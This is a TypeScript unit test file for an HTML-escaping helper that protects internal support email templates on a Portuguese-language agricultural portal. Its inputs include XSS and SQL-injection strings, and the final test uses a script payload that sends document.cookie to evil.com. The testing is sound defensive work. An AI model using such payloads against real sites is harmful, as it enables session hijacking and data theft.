// apps/portal/src/lib/escape-html.test.ts
//
// Garante que escapeHtml protege contra HTML injection nos templates
// de email pro time interno Argho (lib/actions/suporte.ts). Auditoria
// hm-engineer ALTO #5 — spear-phishing via produto_slug ou email.

import { describe, expect, it } from 'vitest';
import { escapeHtml } from './escape-html';

describe('escapeHtml', () => {
  it('returns empty string for empty input', () => {
    expect(escapeHtml('')).toBe('');
  });

  it('preserves benign text unchanged', () => {
    expect(escapeHtml('Recomendação de dose')).toBe('Recomendação de dose');
    expect(escapeHtml('xcensis 500g/ha')).toBe('xcensis 500g/ha');
    expect(escapeHtml('multi-Bacillus 1e8 UFC/mL')).toBe('multi-Bacillus 1e8 UFC/mL');
  });

  it('escapes < and > (basic tag injection)', () => {
    expect(escapeHtml('<script>')).toBe('&lt;script&gt;');
    expect(escapeHtml('<img src=x>')).toBe('&lt;img src=x&gt;');
  });

  it('escapes ampersand first (prevents double-encoding bugs)', () => {
    expect(escapeHtml('a & b')).toBe('a &amp; b');
    expect(escapeHtml('&amp;')).toBe('&amp;amp;');
  });

  it('escapes double and single quotes (attribute breakout)', () => {
    expect(escapeHtml('"onclick=alert(1)"')).toBe('&quot;onclick=alert(1)&quot;');
    expect(escapeHtml("' OR 1=1 --")).toBe('&#39; OR 1=1 --');
  });

  it('escapes complete payload (real attack surface)', () => {
    const payload = '<a href="javascript:alert(\'XSS\')">click</a>';
    const escaped = escapeHtml(payload);
    expect(escaped).not.toContain('<');
    expect(escaped).not.toContain('>');
    expect(escaped).not.toContain('"');
    expect(escaped).not.toContain("'");
    expect(escaped).toContain('&lt;');
    expect(escaped).toContain('&gt;');
    expect(escaped).toContain('&quot;');
    expect(escaped).toContain('&#39;');
  });

  it('handles unicode (LGPD-safe pra texto em PT-BR)', () => {
    expect(escapeHtml('Soja em V3 — déficit de Mn')).toBe('Soja em V3 — déficit de Mn');
    expect(escapeHtml('café 🌱')).toBe('café 🌱');
  });

  it('escapes newlines as-is (preserva pre-formatado)', () => {
    expect(escapeHtml('linha 1\nlinha 2')).toBe('linha 1\nlinha 2');
  });

  it('handles strings full of escapeable chars', () => {
    expect(escapeHtml('&&&')).toBe('&amp;&amp;&amp;');
    expect(escapeHtml('<<<')).toBe('&lt;&lt;&lt;');
    expect(escapeHtml('"""')).toBe('&quot;&quot;&quot;');
  });

  it('idempotente sobre string ja-escapada (re-escapa &)', () => {
    // Intencional — preferimos double-escape a deixar buracos
    expect(escapeHtml('&lt;script&gt;')).toBe('&amp;lt;script&amp;gt;');
  });

  it('email com produto_slug malicioso (caso real do auditoria)', () => {
    const slug = '<script>fetch("//evil.com?c="+document.cookie)</script>';
    expect(escapeHtml(slug)).toBe(
      '&lt;script&gt;fetch(&quot;//evil.com?c=&quot;+document.cookie)&lt;/script&gt;',
    );
  });
});
